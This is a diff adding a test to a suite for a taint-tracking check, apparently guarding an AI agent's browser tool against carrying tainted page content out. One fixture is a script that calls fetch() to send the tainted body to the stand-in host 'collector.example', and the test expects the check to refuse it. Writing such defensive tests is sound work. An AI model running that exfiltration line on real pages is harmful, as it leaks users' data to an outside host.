@@ -131,6 +131,18 @@ describe("browserWriteIsTaintFree — the predicate", () => {
     expect(browserWriteIsTaintFree(sid, "browser", { action: "fill", value: "Gmail Cleanup Tool" }, ["web"])).toBe(false);
   });
 
+  it("an evaluate script is outbound payload: one that embeds the tainted bytes is refused, not cleared as empty", () => {
+    // The script runs in the page and can fetch or beacon anything it holds.
+    // It used to read as an empty payload, so "nothing to carry" cleared it.
+    expect(browserWriteIsTaintFree(sid, "browser", {
+      action: "evaluate", script: `fetch("https://collector.example/?d=" + encodeURIComponent(${JSON.stringify(TAINTED_BODY)}))`,
+    }, ["web"])).toBe(false);
+    // A script with none of the tainted bytes is still judged on its content.
+    expect(browserWriteIsTaintFree(sid, "browser", {
+      action: "evaluate", script: "document.querySelectorAll('table tr').length + ' rows in the pricing table'",
+    }, ["web"])).toBe(true);
+  });
+
   it("refuses a write whose payload carries the tainted bytes", () => {
     expect(browserWriteIsTaintFree(sid, "browser", { action: "type", text: TAINTED_BODY }, ["web"])).toBe(false);
     // The tainted phrase embedded in otherwise-clean text.
